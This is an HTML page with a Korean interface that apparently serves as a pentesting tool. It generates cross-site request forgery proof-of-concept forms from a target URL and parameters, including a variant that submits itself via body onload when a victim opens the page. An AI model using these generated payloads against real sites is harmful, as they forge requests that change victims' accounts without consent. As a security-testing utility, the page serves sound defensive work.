<!DOCTYPE html>
<html lang="ko">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>CSRF PoC Generator</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }

    body {
      min-height: 100vh;
      background: #0d1117;
      color: #e6edf3;
      font-family: 'Segoe UI', sans-serif;
      padding: 2rem 1rem;
    }

    header {
      display: flex;
      align-items: center;
      gap: 1rem;
      max-width: 960px;
      margin: 0 auto 2rem;
    }

    header a { color: #8b949e; text-decoration: none; font-size: 0.9rem; }
    header a:hover { color: #58a6ff; }
    h1 { font-size: 1.6rem; color: #58a6ff; }

    .container { max-width: 960px; margin: 0 auto; }

    .grid {
      display: grid;
      grid-template-columns: 1fr 1fr;
      gap: 1.5rem;
    }

    @media (max-width: 700px) { .grid { grid-template-columns: 1fr; } }

    .panel {
      background: #161b22;
      border: 1px solid #30363d;
      border-radius: 12px;
      padding: 1.5rem;
    }

    .panel h2 {
      font-size: 1rem;
      color: #8b949e;
      margin-bottom: 1.2rem;
      padding-bottom: 0.75rem;
      border-bottom: 1px solid #30363d;
    }

    .form-group { margin-bottom: 1rem; }

    label {
      display: block;
      font-size: 0.8rem;
      color: #8b949e;
      margin-bottom: 0.4rem;
    }

    input, select {
      width: 100%;
      background: #0d1117;
      border: 1px solid #30363d;
      border-radius: 8px;
      color: #e6edf3;
      font-size: 0.9rem;
      padding: 0.55rem 0.75rem;
      outline: none;
      transition: border-color 0.2s;
    }

    input:focus, select:focus { border-color: #58a6ff; }

    .params { margin-top: 0.5rem; }

    .param-row {
      display: grid;
      grid-template-columns: 1fr 1fr auto;
      gap: 0.5rem;
      margin-bottom: 0.5rem;
    }

    .btn-remove {
      background: #3d1a1a;
      color: #f85149;
      border: 1px solid #f85149;
      border-radius: 6px;
      padding: 0.4rem 0.6rem;
      cursor: pointer;
      font-size: 0.8rem;
    }

    .btn-add {
      background: transparent;
      border: 1px dashed #30363d;
      color: #8b949e;
      border-radius: 8px;
      padding: 0.4rem 1rem;
      cursor: pointer;
      font-size: 0.85rem;
      width: 100%;
      margin-top: 0.25rem;
    }

    .btn-add:hover { border-color: #58a6ff; color: #58a6ff; }

    .btn-row {
      display: flex;
      gap: 0.75rem;
      margin-top: 1.2rem;
      flex-wrap: wrap;
    }

    button {
      padding: 0.5rem 1.2rem;
      border-radius: 8px;
      border: none;
      cursor: pointer;
      font-size: 0.9rem;
      font-weight: 600;
      transition: opacity 0.2s;
    }

    button:hover { opacity: 0.85; }

    .btn-generate { background: #1f6feb; color: #fff; }
    .btn-autofire { background: #da3633; color: #fff; }
    .btn-copy     { background: #30363d; color: #e6edf3; }

    textarea {
      width: 100%;
      height: 280px;
      background: #0d1117;
      border: 1px solid #30363d;
      border-radius: 8px;
      color: #e6edf3;
      font-family: 'Courier New', monospace;
      font-size: 0.82rem;
      padding: 0.75rem;
      resize: vertical;
      outline: none;
    }

    textarea:focus { border-color: #58a6ff; }

    .preview-box {
      background: #0d1117;
      border: 1px solid #30363d;
      border-radius: 8px;
      padding: 1rem;
      margin-top: 1rem;
      font-size: 0.82rem;
      color: #8b949e;
    }

    .toast {
      position: fixed;
      bottom: 2rem;
      right: 2rem;
      background: #238636;
      color: #fff;
      padding: 0.6rem 1.2rem;
      border-radius: 8px;
      font-size: 0.85rem;
      opacity: 0;
      transition: opacity 0.3s;
      pointer-events: none;
    }

    .toast.show { opacity: 1; }
  </style>
</head>
<body>
  <header>
    <a href="index.html">← 홈</a>
    <h1>CSRF PoC Generator</h1>
  </header>

  <div class="container">
    <div class="grid">
      <!-- 입력 패널 -->
      <div class="panel">
        <h2>요청 설정</h2>

        <div class="form-group">
          <label>Target URL</label>
          <input type="text" id="targetUrl" placeholder="https://target.com/my-account/change-email">
        </div>

        <div class="form-group">
          <label>Method</label>
          <select id="method">
            <option value="POST">POST</option>
            <option value="GET">GET</option>
          </select>
        </div>

        <div class="form-group">
          <label>Parameters</label>
          <div class="params" id="params">
            <div class="param-row">
              <input type="text" placeholder="name" class="p-name">
              <input type="text" placeholder="value" class="p-value">
              <button class="btn-remove" onclick="removeRow(this)">✕</button>
            </div>
          </div>
          <button class="btn-add" onclick="addRow()">+ 파라미터 추가</button>
        </div>

        <div class="btn-row">
          <button class="btn-generate" onclick="generate(false)">PoC 생성</button>
          <button class="btn-autofire" onclick="generate(true)">자동 제출 PoC</button>
        </div>
      </div>

      <!-- 출력 패널 -->
      <div class="panel">
        <h2>생성된 PoC HTML</h2>
        <textarea id="output" placeholder="PoC 코드가 여기에 생성됩니다..."></textarea>
        <div class="btn-row">
          <button class="btn-copy" onclick="copyOutput()">Copy</button>
          <button class="btn-generate" onclick="openPreview()">브라우저에서 열기</button>
        </div>
        <div class="preview-box">
          자동 제출 PoC: 피해자가 페이지를 열면 즉시 요청이 전송됩니다.<br>
          일반 PoC: 버튼 클릭 시 요청이 전송됩니다.
        </div>
      </div>
    </div>
  </div>

  <div class="toast" id="toast">복사 완료!</div>

  <script>
    function addRow() {
      const row = document.createElement('div');
      row.className = 'param-row';
      row.innerHTML = `
        <input type="text" placeholder="name" class="p-name">
        <input type="text" placeholder="value" class="p-value">
        <button class="btn-remove" onclick="removeRow(this)">✕</button>
      `;
      document.getElementById('params').appendChild(row);
    }

    function removeRow(btn) {
      const rows = document.querySelectorAll('.param-row');
      if (rows.length > 1) btn.parentElement.remove();
    }

    function getParams() {
      const names  = document.querySelectorAll('.p-name');
      const values = document.querySelectorAll('.p-value');
      const params = [];
      names.forEach((n, i) => {
        if (n.value.trim()) params.push({ name: n.value.trim(), value: values[i].value });
      });
      return params;
    }

    function generate(autofire) {
      const url    = document.getElementById('targetUrl').value.trim();
      const method = document.getElementById('method').value;
      const params = getParams();

      if (!url) { alert('Target URL을 입력하세요.'); return; }

      const inputs = params.map(p =>
        `    <input type="hidden" name="${esc(p.name)}" value="${esc(p.value)}">`
      ).join('\n');

      let html;
      if (autofire) {
        html = `<html>
<body onload="document.forms[0].submit()">
  <form action="${esc(url)}" method="${method}">
${inputs}
  </form>
</body>
</html>`;
      } else {
        html = `<html>
<body>
  <form action="${esc(url)}" method="${method}">
${inputs}
    <input type="submit" value="Submit">
  </form>
</body>
</html>`;
      }

      document.getElementById('output').value = html;
    }

    function esc(s) {
      return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
    }

    function copyOutput() {
      const val = document.getElementById('output').value;
      if (!val) return;
      navigator.clipboard.writeText(val).then(() => showToast());
    }

    function openPreview() {
      const val = document.getElementById('output').value;
      if (!val) return;
      const blob = new Blob([val], { type: 'text/html' });
      window.open(URL.createObjectURL(blob));
    }

    function showToast() {
      const t = document.getElementById('toast');
      t.classList.add('show');
      setTimeout(() => t.classList.remove('show'), 1500);
    }
  </script>
</body>
</html>
